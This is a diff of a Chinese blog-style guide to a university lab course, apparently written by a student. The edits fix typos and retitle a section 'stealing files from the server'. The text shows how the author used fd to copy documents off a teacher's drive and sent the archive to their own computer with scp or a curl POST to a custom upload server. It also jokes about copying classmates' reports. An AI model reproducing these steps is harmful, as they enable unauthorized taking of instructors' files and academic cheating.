@@ -34,7 +34,7 @@
 
 报告允许全部使用电子版编写，打印后贴到报告本里。
 
-内容就等等其他人，~~或者因为大家都因为寒假急着回家，此时自告奋勇留在学校收报告，就可以大抄特抄了~~。至于图片，找熟人要一下，或者网上找找都行。
+内容就等等其他人，~~或者因为大家寒假都急着回家，此时自告奋勇留在学校收报告，就可以大抄特抄了~~。至于图片，找熟人要一下，或者网上找找都行。
 
 ## 传文件到服务器
 
@@ -65,13 +65,13 @@
 
 </details>
 
-## hack
+## 从服务器偷文件
 
 <details><summary>展开</summary>
 
 我传了一个 [fd](https://github.com/sharkdp/fd) 用来在教师盘里找文件。我更习惯 fd，感觉比 find 好用。然后用类似 `fd -H -e jpg -e doc -e docx -e ppt -e pptx -x cp {} ~/my` 把貌似有用的资料全部偷下来。
 
-那么如何传到自己的电脑呢？首先先打个 tar.gz，然后有两个方法。
+那么如何传到自己的电脑呢？首先打个 tar.gz，然后有两个方法。
 
 1. 由于自己电脑有公网 IP，所以直接用基于 ssh 的 scp/rsync 即可。需要在 _windows 设置 - 系统 - 可选功能_ 里安装 OpenSSH 服务器，然后把 22 端口开放到公网。
 2. 改一改 http server 的代码，让它可以接受数据输入。用 GPT 快速糊一个：
@@ -111,7 +111,7 @@
        httpd.serve_forever()
    ```
 
-   运行，然后就可以通过 POST 命令上传文件了。这里使用 curl：`curl --noproxy '*' -x P0ST --data-binary @my.tar.gz http://xxx.xxx.xx.xx:55555/a.tar.gz`。noproxy 是必要的，服务器上有奇怪的代理设置。
+   运行，然后就可以通过 POST 命令上传文件了。这里使用 curl：`curl --noproxy '*' -x POST --data-binary @my.tar.gz http://xxx.xxx.xx.xx:55555/a.tar.gz`。noproxy 是必要的，服务器上有奇怪的代理设置。
 
    或者不用 gpt 脚本，直接用现成库 [uploadserver](https://github.com/Densaugeo/uploadserver) 也行。
 
